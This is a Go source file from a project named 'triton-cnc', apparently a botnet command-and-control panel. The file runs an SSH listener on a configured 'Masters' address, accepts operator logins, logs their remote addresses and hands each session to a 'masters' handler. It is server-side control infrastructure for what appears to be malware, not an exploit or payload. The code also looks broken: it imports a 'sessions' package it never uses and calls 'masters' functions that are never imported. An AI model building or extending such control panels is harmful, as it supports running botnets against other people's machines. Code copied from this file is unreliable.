package server

import (
	"log"
	"net"

	"triton-cnc/core/sessions"
	"triton-cnc/core/models/middleware"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/versions"

	"golang.org/x/crypto/ssh"
)


func Serve() {

	Listener, error := net.Listen("tcp", build.Config.Masters.MastersHostPort)
	if error != nil {
		log.Println("[SSH Connection watcher] [Failed to correctly start your ssh connection listener] ["+error.Error()+"]")
		return
	} else {
		log.Println("[SSH Connection watcher] [Correctly started your ssh connection watcher] ["+build.Config.Masters.MastersHostPort+"]")
	}

	go masters.TitleWorker()

	for {
		conn, error := Listener.Accept()
		if error != nil || conn == nil {
			continue
		}

		Connection, chans, reqs, error := ssh.NewServerConn(conn, ServerCon)
		if error != nil {
			continue
		}

		middleware.Log_Timestamp(versions.GOOS_Edition.Make["LogDir"]+"/connections.log", " New Connection from "+Connection.RemoteAddr().String()+" has logged in to "+Connection.User())

		go ssh.DiscardRequests(reqs)
		
		go masters.Channels(chans, Connection)
	}
}